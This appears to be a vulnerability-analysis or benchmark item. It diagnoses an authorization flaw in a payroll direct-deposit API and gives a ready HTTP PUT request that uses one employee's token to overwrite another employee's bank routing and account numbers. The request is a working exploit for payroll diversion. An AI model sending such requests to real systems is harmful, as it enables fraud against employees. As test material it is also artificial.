diagnosis: The direct deposit route uses express-validator to strictly ensure format validity of UUID and bank numbers, but uses the client-supplied employeeId directly in Prisma upsert without verifying that req.user.employeeId matches or that req.user has HR admin permissions, allowing payroll diversion.
exploit_request:
PUT /api/hr/direct-deposit HTTP/1.1
Host: payroll.peoplesoft.internal:6001
Authorization: Bearer <employee_bob_token>
Content-Type: application/json

{"employeeId": "e5c102a0-4100-4ea2-9721-c91823091811", "routingNumber": "121000358", "accountNumber": "99281726354"}
